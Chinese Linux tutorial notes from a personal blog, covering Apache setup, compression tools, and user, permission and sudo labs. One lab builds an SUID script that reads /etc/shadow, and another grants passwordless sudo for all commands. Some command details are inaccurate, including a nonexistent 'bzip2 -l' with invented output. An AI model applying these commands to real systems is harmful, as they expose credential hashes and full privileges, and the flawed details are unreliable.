&lt;h2&gt;联系表单&lt;/h2&gt;            &lt;form&gt;                &lt;input type=&quot;text&quot; placeholder=&quot;您的姓名&quot; required&gt;                &lt;input type=&quot;email&quot; placeholder=&quot;电子邮箱&quot; required&gt;                &lt;textarea placeholder=&quot;您的留言&quot; rows=&quot;4&quot; required&gt;&lt;/textarea&gt;                &lt;button type=&quot;submit&quot; class=&quot;btn&quot;&gt;发送消息&lt;/button&gt;            &lt;/form&gt;        &lt;/div&gt;                &lt;div class=&quot;card&quot; style=&quot;margin-top: 40px;&quot;&gt;            &lt;h2&gt;图片展示&lt;/h2&gt;            &lt;div class=&quot;gallery&quot;&gt;                &lt;img src=&quot;https://picsum.photos/300/200?random=1&quot; alt=&quot;示例图片&quot;&gt;                &lt;img src=&quot;https://picsum.photos/300/200?random=2&quot; alt=&quot;示例图片&quot;&gt;                &lt;img src=&quot;https://picsum.photos/300/200?random=3&quot; alt=&quot;示例图片&quot;&gt;                &lt;img src=&quot;https://picsum.photos/300/200?random=4&quot; alt=&quot;示例图片&quot;&gt;            &lt;/div&gt;        &lt;/div&gt;                &lt;footer&gt;            &lt;p&gt;© 2023 简单HTML页面示例 | 使用纯HTML和CSS创建&lt;/p&gt;            &lt;p&gt;本页面仅用于演示目的&lt;/p&gt;        &lt;/footer&gt;    &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;[root@wyf html]# cd /etc/httpd/conf.d[root@wyf conf.d]# lsautoindex.conf  README  userdir.conf  welcome.conf[root@wyf conf.d]# pwd/etc/httpd/conf.d[root@wyf conf.d]# vim study.conf&lt;VirtualHost *:80&gt;\tServerName study.com     # 主域名  \tServerAlias www.study.com  # 备用域名\tDocumentRoot /var/www/study/html   # 网站根目录\tErrorLog /var/www/study/log/error.log  # 错误日志\tCustomLog /var/www/study/log/access.log combined  # 访问日志&lt;/VirtualHost&gt;[root@wyf conf.d]# chown apache:apache /var/www/study/html /var/www/study/log[root@wyf conf.d]# chmod 755 /var/www/study[root@wyf conf.d]# ll -h /var/www总用量 0drwxr-xr-x. 2 root root  6 11月 12 2021 cgi-bindrwxr-xr-x. 2 root root 24 8月   4 18:21 htmldrwxr-xr-x. 4 root root 29 8月   4 19:22 study[root@wyf conf.d]# vim /etc/hosts 127.0.0.1 study.com\n\n\n","slug":"CentOS-8-Apache搭建","date":"2025-08-04T07:26:07.000Z","categories_index":"","tags_index":"Linux","author_index":"wyf"},{"id":"0c1c2c1e48cec6fa1eb6b9dfea7522c2","title":"压缩与解压缩","content":"压缩与解压缩一、生成测试文件（dd命令）1.生成一个大小为100M的全是二进制的0的文件1234[root@wyf tmp]# dd if=/dev/zero of=/tmp/testfile bs=1M count=100记录了100+0 的读入记录了100+0 的写出104857600 bytes (105 MB, 100 MiB) copied, 0.140521 s, 746 MB/s\n\n\ndd\n底层数据复制&#x2F;转换工具\n以固定块（block）为单位处理数据\n\n\nif=/dev/zero\n输入源（Input File）\n/dev/zero：Linux 特殊设备文件\n功能：读取时产生无限的空字节流（二进制 0x00）\n\n\nof=/tmp/testfile\n输出目标（Output File）\n/tmp/testfile：在临时目录中创建文件\n特性：文件会被创建或完全覆盖（已有内容将被删除）\n\n\nbs=1M\n块大小（Block Size）\n1M &#x3D; 1 mebibyte &#x3D; 1048576 字节（注意：非公制1MB&#x3D;1000000字节，此处是二进制单位）\n\n\ncount=100\n复制的块数量\n与 bs=1M 配合 → 总大小 &#x3D; 100 × 1M &#x3D; 100 MiB\n\n\n\nMiB（Mebibyte）是计算机领域专用的二进制容量单位，用于精确计量基于 2 的幂次方的数据大小。它是传统单位“兆字节（MB）”在二进制系统中的标准化替代方案，旨在解决单位混淆问题。\n\n\n\n单位\n全称\n计算基数\n字节数\n用途场景\n\n\n\nMiB\nMebibyte\n2²⁰ (二进制)\n1,048,576 字节\n操作系统、内存、存储工具（如 dd, ls）\n\n\nMB\nMegabyte\n10⁶ (十进制)\n1,000,000 字节\n硬盘厂商、网络传输、部分商业软件\n\n\n1234[root@wyf tmp]# ll /tmp |grep testfile-rw-r--r--. 1 root    root    104857600 8月   4 10:13 testfile[root@wyf tmp]# ll -h /tmp |grep testfile-rw-r--r--. 1 root    root    100M 8月   4 10:13 testfile\n\n\n\n\n命令\n显示内容\n单位含义\n\n\n\nls -l\n104857600\n精确字节数\n\n\nls -lh\n100M\n100 MiB (1 MiB &#x3D; 1,048,576 B)\n\n\n\n\n\n特性\n/dev/zero\n/dev/null\n\n\n\n读操作\n无限产生零字节 (0x00)\n立即返回 EOF\n\n\n写操作\n接受写入但丢弃\n接受写入并永久丢弃\n\n\n数据特性\n固定内容（零字节）\n无内容\n\n\n文件大小\n读取时无限大\n读取时大小为0\n\n\n常见用途\n创建空文件&#x2F;测试内存&#x2F;磁盘预填充\n屏蔽输出&#x2F;清空文件&#x2F;输入终结\n\n\n符号链接\ncrw-rw-rw- (字符设备)\ncrw-rw-rw- (字符设备)\n\n\n2.查看文件12345678910111213141516171819[root@wyf tmp]# file /tmp/testfile          /tmp/testfile: data                       #file命令通过检测文件内容来判断文件类型。由于testfile全部是零字节，没有可识别的文件头或特定结构，因此被识别为“data”（即原始数据）。[root@wyf tmp]# file /tmp/file10.txt/tmp/file10.txt: ASCII text               #这个文件包含可识别的ASCII文本字符，所以file命令成功识别为文本文件。[root@wyf tmp]# cat testfile              #cat命令尝试输出文件内容，但该文件全是零字节（0x00），在终端上不显示任何可见字符（相当于空）。终端遇到零字节不会产生任何可见输出，也没有换行符，所以提示符直接出现在下一行。终端尝试将二进制 0x00 解释为 ASCII 字符，ASCII 0x00 是 NUL 字符（空字符），在终端中不可见，文件内容无换行符 → 终端光标停留在行首无回显 → 看似无输出，实际已输出 100MiB 的 NUL 字符[root@wyf tmp]# hexdump testfile          0000000 0000 0000 0000 0000 0000 0000 0000 0000*6400000#0000000：起始偏移量（十六进制）。#中间一行全是0000，表示连续的零字节。*表示之前相同的行被省略（压缩显示）。#6400000：最后显示的偏移量（十六进制），表示文件结束位置。#转换：十六进制0x6400000字节 → 十进制：104857600字节（即100 MiB）。#hexdump 显示原理#一行显示 16 字节 (8组×2字节)，格式：[偏移量] [8组十六进制值]#当连续相同内容时：只显示第一行，用 * 符号表示重复直到结束#**最终行 6400000**，表示文件终止于 0x6400000 - 1 位置\n\n二、压缩命令 gzipgzip 是 Linux 中高效的文件压缩工具，使用 Lempel-Ziv (LZ77) 算法。。压缩后会生成 .gz 后缀文件，默认删除原始文件。\n\n\n\n特点\n说明\n\n\n\n压缩率\n通常减少 60%-70% 文本文件大小\n\n\n压缩速度\n比 bzip2&#x2F;xz 快，但压缩率略低\n\n\n默认操作\n直接替换原文件 (加 .gz 扩展名)\n\n\n格式支持\n.gz 格式标准，所有 UNIX&#x2F;Linux 通用\n\n\n命令格式12gzip [选项] 文件名gunzip [选项] 文件名.gz  # 解压等价于 gzip -d\n\n参数解读\n\n\n参数\n功能\n示例\n\n\n\n-d\n解压缩 (等同 gunzip)\ngzip -d file.gz\n\n\n-k\n保留原始文件 (默认删除)\ngzip -k file.txt\n\n\n-c\n输出到终端，不修改文件\ngzip -c file &gt; file.gz\n\n\n-v\n显示压缩详情 (压缩率&#x2F;耗时)\ngzip -v log.txt\n\n\n-l\n列出压缩文件信息\ngzip -l backup.gz\n\n\n-r\n递归压缩目录下所有文件\ngzip -r documents/\n\n\n-t\n测试压缩文件完整性\ngzip -t testfile.gz\n\n\n-1~&#96;-9&#96;\n压缩级别 (1&#x3D;最快, 9&#x3D;最小，默认压缩级别 &#x3D; -6 (速度&#x2F;压缩率平衡))\ngzip -9 database.sql\n\n\n使用方法（1）基础操作12345678910[root@wyf tmp]# gzip testfile                                      #生成testfile.gz并删除源文件[root@wyf tmp]# ll -h /tmp | grep testfile-rw-r--r--. 1 root    root    100K 8月   4 10:13 testfile.gz[root@wyf tmp]# file testfile.gz testfile.gz: gzip compressed data, was &quot;testfile&quot;, last modified: Mon Aug  4 02:13:13 2025, from Unix, original size 104857600#gzip compressed data：标准gzip压缩文件格式#was &quot;testfile&quot;：原始文件名#last modified:：最终压缩时间#original size 104857600：原始文件大小#from Unix：在Unix/Linux系统上创建\n\n\n\n\n文件状态\n原始文件 (testfile)\n压缩文件 (testfile.gz)\n\n\n\n大小\n104,857,600 字节\n102,400 字节\n\n\n人类可读\n100 MiB\n100 KiB\n\n\n压缩率\n-\n0.098% (压缩比 ≈ 1:1024)\n\n\n节省空间\n-\n99.902%\n\n\n为什么压缩率这么高？因为全零文件在压缩时，会被视为大量的重复序列。在gzip中，连续的重复序列可以被压缩成很短的引用。实际上，由于整个文件都是0，所以压缩后的数据主要是存储一些元数据和重复标记。\n注意：这里的ratio（压缩率）计算方式：ratio &#x3D; (1 - compressed_size&#x2F;uncompressed_size) * 100%即 (1 - 102400&#x2F;104857600)*100% ≈ 99.9%，表示压缩节省了99.9%的空间。\n但是显示的是99.9%，实际上压缩率是0.1%。注意gzip这里显示的ratio是指节省的比例（节省了99.9%），而不是压缩率（压缩率是原始大小除以压缩后大小，或者节省比例的反面）。\n1234[root@wyf tmp]# gzip -k testfile                        #生成testfile.gz并保留源文件[root@wyf tmp]# ll -h /tmp | grep testfile-rw-r--r--. 1 root    root    100M 8月   4 10:45 testfile-rw-r--r--. 1 root    root    100K 8月   4 10:45 testfile.gz\n\n（2）解压操作1234567[root@wyf tmp]# gunzip testfile.gz                      #解压不保留testfile.gz[root@wyf tmp]# ll -h /tmp | grep testfile-rw-r--r--. 1 root    root    100M 8月   4 10:45 testfile[root@wyf tmp]# gzip -d -k testfile.gz                  #解压保留testfile.gz[root@wyf tmp]# ll -h /tmp | grep testfile-rw-r--r--. 1 root    root    100M 8月   4 10:45 testfile-rw-r--r--. 1 root    root    100K 8月   4 10:45 testfile.gz\n\n（3）查看压缩内容1234567891011[root@wyf tmp]# zcat testfile.gz#zcat 用于查看压缩文件的内容而不解压，它会将解压后的内容输出到标准输出。但是这里执行后没有输出，这是因为原始文件 testfile 是由 /dev/zero 创建的，全部是0x00（NUL字符）。当终端尝试显示这些NUL字符时，它们不会被显示出来（在终端中显示为空）。因此看起来没有输出，但实际上已经将104857600字节的0x00发送到了终端。[root@wyf tmp]# gzip -l testfile.gz         compressed        uncompressed  ratio uncompressed_name             101800           104857600  99.9% testfile#这个命令显示了压缩文件的统计信息：#compressed: 101800 字节（压缩后的文件大小）#uncompressed: 104857600 字节（原始文件大小）#ratio: 99.9% （压缩率）#uncompressed_name: testfile\n\n为什么压缩后是101800字节？- 之前我们压缩相同类型的文件（全零）时，压缩后的大小大致为原始大小的1&#x2F;1024（即100MB压缩后大约是100KB，即102400字节），但这里为什么是101800字节？- 原因在于gzip文件格式有文件头（header）和文件尾（footer）的额外开销。另外，压缩算法对全零数据虽然可以用很短的重复标记表示，但gzip格式的块结构也会带来一些额外字节。\n\n\n\n因素\n影响\n占比\n\n\n\ngzip头信息\n固定开销\n~18字节\n\n\n原始文件名存储\n“testfile” (8字节)\n+9字节\n\n\n尾部校验块\nCRC32+长度\n8字节\n\n\n算法优化差异\n不同gzip版本处理全零数据\n-423字节\n\n\n三、压缩命令bzip2bzip2 是 Linux 中基于 Burrows-Wheeler 变换 的高效压缩工具，相比 gzip 压缩率更高，但速度较 慢。压缩后生成 .bz2 后缀文件，默认删除原始文件。\n命令格式12bzip2 [选项] 文件名                             # 压缩文件bunzip2 [选项] 文件名.bz2                       # 解压（等价于 bzip2 -d）\n\n\n\n\n特性\ngzip\nbzip2\n\n\n\n算法\nDEFLATE (LZ77)\nBurrows-Wheeler + RLE\n\n\n压缩率\n★★★☆☆\n★★★★☆ (高 10%-20%)\n\n\n速度\n⚡️ 快\n⚠️ 慢 (约1&#x2F;2-1&#x2F;3)\n\n\n内存占用\n低 (~100 KB)\n高 (~6-50 MB)\n\n\n扩展名\n.gz\n.bz2\n\n\n典型用例\n通用文本&#x2F;日志\n数据库&#x2F;代码归档\n\n\n参数解读\n\n\n参数\n作用\n示例\n\n\n\n-z\n强制压缩 (默认行为)\nbzip2 -z data.log\n\n\n-t\n测试压缩包完整性\nbzip2 -t backup.bz2\n\n\n-v\n显示压缩详情\nbzip2 -v largefile.iso\n\n\n-1 ~ -9\n压缩级别 (1最快&lt;9最强)\nbzip2 -9 database.sql\n\n\n--fast\n等效 -1 (快速低压缩)\nbzip2 --fast temp.dat\n\n\n--best\n等效 -9 (最强压缩)\nbzip2 --best archive.tar\n\n\n-s\n降低内存用量 (牺牲速度)\nbzip2 -s dataset.csv\n\n\n-f\n强制覆盖已存在的输出文件\nbzip2 -f data.csv\n\n\n-c\n输出到标准输出（不修改文件）\nbzip2 -c orig.txt &gt; orig.txt.bz2\n\n\n-d\n解压文件（同 bunzip2）\nbzip2 -d compressed.bz2\n\n\n-k\n保留原始文件（压缩&#x2F;解压后不删除）\nbzip2 -k bigfile.log\n\n\n使用方法（1）基础操作1234567891011121314[root@wyf tmp]# mkdir 222[root@wyf tmp]# cp /tmp/testfile /tmp/222/[root@wyf tmp]# cd 222[root@wyf 222]# lstestfile[root@wyf 222]# bzip2 testfile                           #生成testfile.gz并删除源文件[root@wyf 222]# ll -h testfile.bz2-rw-r--r--. 1 root root 113 8月   4 11:21 testfile.bz2[root@wyf 222]# bzip2 -k testfile1                       #生成testfile.gz并保留源文件[root@wyf 222]# ll -h /tmp/222 | grep testfile1-rw-r--r--. 1 root root 100M 8月   4 11:22 testfile1-rw-r--r--. 1 root root  113 8月   4 11:22 testfile1.bz2\n\n之前使用 gzip 压缩同样的文件时，我们得到的是100KiB（约102,400字节）左右。现在用bzip2压缩后只有113字节，这是因为：\n\nbzip2 在压缩全零文件时，能够以极高的效率表示这个全零序列。\n其压缩后的数据包括文件头、重复标记和文件尾，但整个文件被压缩成一个非常小的数据块。\n\n（2）解压操作12345[root@wyf 222]# bunzip2 testfile.bz2                      #解压不保留testfile.bz2[root@wyf 222]# lstestfile  testfile1  testfile1.bz2[root@wyf 222]# bzip2 -dk testfile.bz2                    #解压保留testfile.bz2\n\n（3）查看压缩内容123456[root@wyf 222]# bzcat testfile1.bz2                       #不解压查看内容[root@wyf 222]# bzip2 -l testfile1.bz2                    #（bzip2 版本 ≥ 1.0.8）显示压缩信息：# Compression ratio: 4.20:1# compressed size: 102400 bytes  # uncompressed size: 430080 bytes   \n\n四、打包命令tar实验目标建立两个大小为 10M 和 20M 的文件 分别命名为 big1 和 big2 将其放入 &#x2F;tmp&#x2F;test123 文件夹中。尝试对文件夹进行压缩\ntar命令功能tar （Tape Archive）是 Linux 系统中用于 打包文件&#x2F;目录 的归档工具，支持保留文件权限、时间戳和目录结构（不对文件&#x2F;目录本身造成任何影响，产生新文件）。常与压缩工具（  gzip 、 bzip2 、 xz ）结合使用，形成  .tar.gz 、 .tar.bz2 、  .tar.xz 等压缩包。\n\n\n\n功能类型\n描述\n典型应用\n\n\n\n打包\n合并文件到单个归档\n备份、分发\n\n\n解包\n提取归档内容\n恢复数据、部署\n\n\n压缩\n结合 gzip&#x2F;bzip2&#x2F;xz 等压缩\n节省存储空间\n\n\n查看\n检查归档内容\n验证文件列表\n\n\n基础语法1tar [主选项] [辅选项] 文件名或目录\n\n参数说明主操作模式（必选其一）\n常用辅选项\n典型使用场景(1) 打包与压缩123tar -cvf test.tar test test2            #打包不压缩tar -czvf test.tar.gz test              #打包并压缩\n\n(2) 解压操作12345tar -xvf test.tar                       #解压tar -xvf test321.tar -C /root/桌面       #解压到指定目录tar -xzvf test.tar                      #解压压缩包\n\n(3) 查看归档内容1tar -tvf test.tar                       #查看\n\n(4)备份1tar -g   \n\n(5) 高级用法12345678# 排除特定文件/目录tar -czvf site.tar.gz --exclude=&quot;*.tmp&quot; --exclude=&quot;cache/&quot; /var/www/# 使用通配符打包多个文件tar -czvf logs.tar.gz /var/log/*.log# 增量备份（仅打包新修改的文件）tar -czvf incremental_backup.tar.gz --newer-mtime=&quot;2023-01-01&quot; /data/\n\n","slug":"压缩与解压缩","date":"2025-08-04T01:57:25.000Z","categories_index":"","tags_index":"Linux","author_index":"wyf"},{"id":"68aff33ae6cfc1bb8060d056a6e4a6e3","title":"Linux基础综合练习1","content":"实验1：文件目录结构与基本命令操作1、在&#x2F;tmp目录下创建如下目录结构：1234567/tmp/test/├── dir1/│   ├── file1.txt│   └── file2.txt├── dir2/│   └── subdir/└── file3.txt\n\n1234567[root@wyf 桌面]# cd /tmp                                            #进入/tmp目录[root@wyf tmp]# mkdir -p /tmp/test/dir1 /tmp/test/dir2/subdir      #递归创建目录/test/dir1，/test/dir2/subdir[root@wyf tmp]# cd test                                            #进入/test目录[root@wyf test]# cd dir1                                           #进入/dir1目录[root@wyf dir1]# touch file1.txt file2.txt                         #创建文件file1.txt file2.txt[root@wyf dir1]# cd ..                                             #回到上一级/test目录[root@wyf test]# touch file3.txt                                   #创建文件file3.txt\n\n\n2、将dir1目录及其内容复制到dir2&#x2F;subdir下1[root@wyf test]# cp -r dir1 dir2/subdir                             #将dir1目录及其内容复制到dir2/subdir下\n\n\n3、查找&#x2F;tmp目录下所有.txt文件并显示详细信息1[root@wyf test]# find /tmp -type f -name &quot;*.txt&quot; -exec ls -l &#123;&#125; \\;  #查找/tmp目录下所有.txt文件并显示详细信息\n\n\n4、将file3.txt移动到dir1目录并重命名为newfile.txt1[root@wyf test]# mv file3.txt dir1/newfile.txt\n\n\n实验2：用户与组管理1、创建用户user1、user2和组group1123[root@wyf test]# useradd user1                #创建用户user1[root@wyf test]# useradd user2                #创建用户user2[root@wyf test]# groupadd group1              #创建组group1\n\n\n\n2、将user1和user2加入group1组12[root@wyf test]# usermod -aG group1 user1      #将user1加入group1组[root@wyf test]# usermod -aG group1 user2      #将user2加入group1组\n\n\n3、创建目录&#x2F;shared，设置权限使group1组成员可以读写，其他人无权限123[root@wyf test]# mkdir /tmp/test/shared          #创建目录/shared[root@wyf test]# chgrp group1 /tmp/test/shared   #设置权限group1组[root@wyf test]# chmod 770 /tmp/test/shared      #使group1组成员可以读写，其他人无权限\n\n\n4、验证user1可以在&#x2F;shared中创建文件，user3(非组成员)不能访问\n\n实验3：权限管理(UGO)1、创建文件&#x2F;data&#x2F;secret.txt，内容为”Top Secret”1234[root@wyf test]# mkdir -p /tmp/test/data         #创建目录data[root@wyf test]# cd data                         #进入data[root@wyf data]# touch secret.txt                #创建文件/data/secret.txt[root@wyf data]# vim secret.txt                  #内容为&quot;Top Secret&quot;\n\n\n2、设置权限：所有者root可读写，组admin可读，其他人无权限1234567891011121314[root@wyf data]# ls -l总用量 4-rw-r--r--. 1 root root 11 8月   2 15:43 secret.txt[root@wyf data]# groupadd admin                             #创建组admin[root@wyf data]# tail -n 1 /etc/groupadmin:x:1009:[root@wyf data]# chgrp admin secret.txt                     #更改属组[root@wyf data]# ls -l总用量 4-rw-r--r--. 1 root admin 11 8月   2 15:43 secret.txt[root@wyf data]# chmod o-r secret.txt                       #设置权限：所有者root可读写，组admin可读，其他人无权限[root@wyf data]# ls -l总用量 4-rw-r-----. 1 root admin 11 8月   2 15:43 secret.txt\n\n3、创建用户testuser并尝试访问该文件验证权限1234[root@wyf data]# useradd testuser                       #创建用户testuser[root@wyf data]# tail -n 1 /etc/passwdtestuser:x:1007:1010::/home/testuser:/bin/bash[root@wyf data]# su - testuser\n\n\n\n\n4、使用ACL添加testuser的读写权限1[root@wyf data]# setfacl -m u:testuser:rw /tmp/test/data/secret.txt      #使用ACL添加testuser的读写权限 \n\n\n\n\n实验4：SUID权限应用1、创建脚本&#x2F;usr&#x2F;local&#x2F;bin&#x2F;showfile，内容为显示&#x2F;etc&#x2F;shadow文件内容123456#showfileecho &#x27;#!/bin/bash                                     #在终端输出文本内容cat /etc/shadow&#x27; &gt; /usr/local/bin/showfile            #将/etc/shadow的输出内容写入/usr/local/bin/showfilechmod +x /usr/local/bin/showfile                      #添加可执行权限（个人感觉脚本有问题，第一行少个单引号，第二行多一个单引号）\n\n12[root@wyf ~]# cd /usr/local/bin         #切换目录[root@wyf bin]# vim showfile            #创建脚本并写入\n\n\n\n2、设置脚本所有者为root并添加SUID权限1[root@wyf bin]# chmod u+xs showfile                   #添加SUID权限\n\n\n3、使用普通用户执行该脚本验证权限提升1234[root@wyf bin]# su - testuser                       #切换测试用户[testuser@wyf ~]$ cd /usr/local/bin                 #切换目录[testuser@wyf bin]$ ./showfile                      #执行-bash: ./showfile: 权限不够\n\nLinux内核设计上不允许脚本文件（如以#!/bin/bash开头的文件）利用SUID。这是为了防止安全漏洞。因此，即使正确设置了SUID和执行权限，testuser也无法以root权限执行这个脚本。\n4、实验完成后移除SUID权限1234567[testuser@wyf bin]$ su - root密码：[root@wyf ~]# cd /usr/local/bin[root@wyf bin]# chmod u-s showfile[root@wyf bin]# ls -l总用量 4-rwxr--r--. 1 root root 94 8月   2 16:05 showfile\n\n实验5：文件属性保护1、创建重要配置文件&#x2F;etc&#x2F;important.conf1[root@wyf etc]# touch important.conf\n\n\n2、使用chattr命令防止文件被修改或删除1[root@wyf etc]# chattr +i important.conf\n\n\n3、尝试修改和删除文件验证保护效果1[root@wyf etc]# rm -rf important.conf\n\n\n4、恢复文件正常属性1[root@wyf etc]# chattr -i important.conf\n\n\n实验6：sudo权限配置1、创建用户admin和组sudoadmin12[root@wyf ~]# useradd admin            #创建用户admin[root@wyf ~]# groupadd sudoadmin       #创建组sudoadmin\n\n\n2、配置sudo使sudoadmin组成员可以执行所有命令无需密码12[root@wyf ~]# visudo                      #配置文件/etc/sudoers%sudoadmin ALL=(ALL) NOPASSWD: ALL        #使sudoadmin组成员可以执行所有命令无需密码\n\n\n3、将admin用户加入sudoadmin组1[root@wyf ~]# usermod -aG sudoadmin admin        #将admin用户加入sudoadmin组\n\n\n4、验证admin用户可以使用sudo执行特权命令\n实验7：综合权限管理1、创建目录&#x2F;project，属组为devteam1234[root@wyf test]# mkdir project               #创建目录/project[root@wyf project]# groupadd devteam         #创建组devteam[root@wyf project]# cd ..[root@wyf test]# chgrp devteam project       #属组为devteam\n\n\n2、设置权限：组成员可读写，其他人只读1[root@wyf test]# chmod 764 project            #组成员可读写，其他人只读\n\n\n3、设置SGID权限使新建文件自动继承组权限1[root@wyf test]# chmod 2774 project            #设置SGID权限 \n\n\n4、创建用户dev1、dev2并加入devteam组1234[root@wyf test]# useradd dev1                   #创建用户dev1[root@wyf test]# useradd dev2                   #创建用户dev2[root@wyf test]# usermod -aG devteam dev1       #用户dev1加入devteam组[root@wyf test]# usermod -aG devteam dev2       #用户dev2加入devteam组\n\n\n5、验证dev1创建的文件dev2可以编辑\n\n实验8：日志分析与安全审计1、创建日志文件 将以下内容保存为 /var/log/application.log：\n123456782024-03-15 09:10:22 [INFO] User &#x27;admin&#x27; authenticated from 192.168.1.100 (session: SESS-7X2G9P)2024-03-15 09:11:05 [ERROR] Failed login attempt for user &#x27;root&#x27; from 10.0.0.55 (reason: invalid password)2024-03-15 09:12:33 [WARNING] High CPU usage detected (92%) on server-node-012024-03-15 09:13:17 [SECURITY] Sensitive file accessed: /etc/shadow by user &#x27;backup&#x27;2024-03-15 09:14:02 [DEBUG] API request: GET /api/v1/users?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...2024-03-15 09:15:48 [INFO] Payment processed: $250.00 via Credit Card (ref: PAY-8832)2024-03-15 09:16:30 [ERROR] Database connection timeout (MySQL@10.0.0.100:3306)2024-03-15 09:17:11 [ALERT] SSH brute force detected from 45.33.12.88 (15 attempts)\n\n1[root@wyf log]# vim application.log\n\n\n2、设置权限12chmod 640 /var/log/application.logchown root:adm /var/log/application.log\n\n任务1.1：统计日志中所有错误事件的数量1[root@wyf log]# grep -c &quot;ERROR&quot; application.log      #统计日志中所有错误事件的数量\n\n\n任务1.2：提取所有包含IP地址的行（仅显示IP）1[root@wyf log]# grep -Eo &quot;([0-9]&#123;1,3&#125;\\.)&#123;3&#125;[0-9]&#123;1,3&#125;&quot; application.log    #提取所有包含IP地址的行,仅显示IP\n\n\n任务2.1：查看SECURITY事件及其前后1行内容1[root@wyf log]# grep -C1 &quot;SECURITY&quot; application.log              #查看`SECURITY`事件及其前后1行内容\n\n\n任务3.1：找出所有涉及金额的记录（含$符号）1[root@wyf log]# grep &#x27;\\$&#x27; application.log                         #找出所有涉及金额的记录（含`$`符号）\n\n\n扩展任务：提取金额数值并计算总和1[root@wyf log]# grep &quot;Payment processed&quot; /var/log/application.log | grep -oP &#x27;\\$\\K\\d+\\.\\d&#123;2&#125;&#x27; | paste -sd+ | bc\n\n\ngrep &quot;Payment processed&quot;：筛选包含支付记录的行\ngrep -oP &#39;\\$\\K\\d+\\.\\d&#123;2&#125;&#39;：提取$后的金额数字（如250.00）\npaste -sd+：将多行数字转换成250.00+...的加法表达式\nbc：计算表达式结果\n\n\n时间范围统计：统计09:10-09:15期间的事件数量1[root@wyf log]# grep -Ec &quot;2024-03-15 09:1[0-5]&#123;1&#125;&quot; application.log       #统计09:10-09:15期间的事件数量\n\n\n任务4.1：检测潜在暴力破解行为1[root@wyf log]# grep &quot;Failed login\\|brute force&quot; /var/log/application.log\n\n\n任务5.1：分析脚本文件生成安全事件报告123456echo &quot;安全事件报告&quot; &gt; report.txt\t\t                 #输出文本内容重定向到report.txtdate &gt;&gt; report.txt                                   #显示当前系统日期和时间,然后输出追加到report.txt文件末尾echo &quot;=== 高风险事件 ===&quot; &gt;&gt; report.txt                #在报告中添加&quot;高风险事件&quot;章节标题grep -E &quot;SECURITY|ALERT&quot; /var/log/application.log &gt;&gt; report.txt  #匹配包含&quot;SECURITY&quot;或&quot;ALERT&quot;的行，将匹配结果追加到报告echo &quot;=== 异常IP列表 ===&quot; &gt;&gt; report.txt                #在报告中添加&quot;异常IP列表&quot;章节标题grep -Eo &quot;([0-9]&#123;1,3&#125;\\.)&#123;3&#125;[0-9]&#123;1,3&#125;&quot; /var/log/application.log | sort -u &gt;&gt; report.txt  #提取日志中所有唯一的IP地址列表，将匹配结果追加到报告\n\n\n","slug":"Linux基础综合练习1","date":"2025-08-02T03:29:42.000Z","categories_index":"","tags_index":"Linux","author_index":"wyf"},{"id":"bcdac3d434efc7f27225ef4360e8f77f","title":"用户权限","content":"用户权限一、基本权限UGO1.UGO的含义​\tU (User)：文件或目录的所有者（创建者或通过 chown 指定的用户）-属主 \n​\tG (Group)：文件或目录的所属组（通过  chgrp 或  chown 指定的用户组）-属组 \n​\tO (Other)：既不是所有者，也不在所属组中的其他所有用户\n2.权限类型每个角色（U&#x2F;G&#x2F;O）可分配以下三种权限： \n​\tr (read)：读取文件内容，或列出目录中的文件。 \n​\tw (write)：修改文件内容，或在目录中创建&#x2F;删除文件。 \n​\tx (execute)：执行文件（如脚本），或进入目录。\n3. 查看权限使用 ls -l 命令查看文件或目录的权限：\n1ls -l /root\n\n1-rw-r--r-- 1 alice developers 1024 Jan 1 12:34 example.txt\n\n-rw-r–r–：\n​\t第1位：- 表示文件，d 表示目录。 \n​\t第2-4位：User 的权限（ rw- ：可读可写，不可执行）。 \n​\t第5-7位：Group 的权限（ r– ：仅可读）。 \n​\t第8-10位：Other 的权限（ r– ：仅可读）。\n4. 权限的两种表示方式符号表示法（rwx）直接使用 r、w、x 表示权限。\n1rwxr-x---\n\n​\tUser： rwx （读、写、执行） \n​\tGroup： r-x （读、执行） \n​\tOther：— （无权限）\n数字表示法将rwx转换为数字相加：   \n​\tr &#x3D; 4（2²） \n​\tw &#x3D; 2（2¹） \n​\tx &#x3D; 1（2⁰）\n1rwxr-x---          #750\n\n​\tUser： 4+2+1&#x3D;7 \n​\tGroup： 4+0+1&#x3D;5 \n​\tOther： 0+0+0&#x3D;0\n5. 修改权限（ chmod 命令）语法12使用符号：u用户 g组  o其他  r读   w写  x执行语法： chmod   对象(u/g/o/a)赋值符(+/-/=)权限类型(r/w/x) 文件/目录   \n\n符号模式12#给 User 添加执行权限，Group 移除写权限，Other 设置只读chmod u+x,g-w,o=r example.txt\n\n数字模式12# 设置权限为 rw-r-----（User可读可写，Group可读，Other无权限）chmod 640 example.txt\n\n实验1：查看当前目录的权限12345678910111213141516[root@wyf 桌面]# ll /tmp            #无法看到/tmp 目录的权限总用量 16-rw-r--r--. 1 root root 2066 7月  28 19:41 anaconda.log-rw-r--r--. 1 root root 2604 7月  28 19:40 dbus.logdrwxr-xr-x. 2 root root   18 7月  28 19:35 hsperfdata_root-rw-r--r--. 1 root root    0 7月  28 19:40 ifcfg.log-rwx------. 1 root root 1379 7月  28 19:39 ks-script-wk_ixipf-rw-r--r--. 1 root root    0 7月  28 19:40 packaging.logdrwxr-xr-x. 3 root root   35 7月  30 10:59 practice-rw-r--r--. 1 root root  131 7月  28 19:40 program.log-rw-r--r--. 1 root root    0 7月  28 19:40 sensitive-info.logdrwx------. 2 root root   24 8月   1 10:58 ssh-EaDVMIIat0qo-rw-r--r--. 1 root root    0 7月  28 19:40 storage.log[root@wyf 桌面]# ll -d /tmp         #-d 命令查看当前目录drwxrwxrwt. 22 root root 4096 8月   1 10:59 /tmp\n\n实验2：可执行文件1.在&#x2F;tmp目录中创建file.txt，编辑文件写入以下内容123echo &quot;hello zhouwu&quot;read -p &quot;please your name?&quot; nameecho &quot;$name good&quot; \n\n2.为用户添加file.txt的执行权限1chmod u+x /tmp/file.txt\n\n3.观察文件类型\n4.执行文件内容，观察程序运行123456[root@wyf 桌面]# cd /tmp[root@wyf tmp]# ./file.txthello zhouwuplease your name?wyfwyf good[root@wyf tmp]# \n\n5.去除权限，运行失败1234[root@wyf tmp]# chmod u-x /tmp/file.txt[root@wyf tmp]# ./file.txtbash: ./file.txt: 权限不够[root@wyf tmp]# \n\n实验3：为所有用户添加执行权限1chmod +x script.sh  # 所有角色添加执行权限（不推荐）\n\n实验4：目录场景允许其他人查看目录内容，但禁止修改：\n1chmod 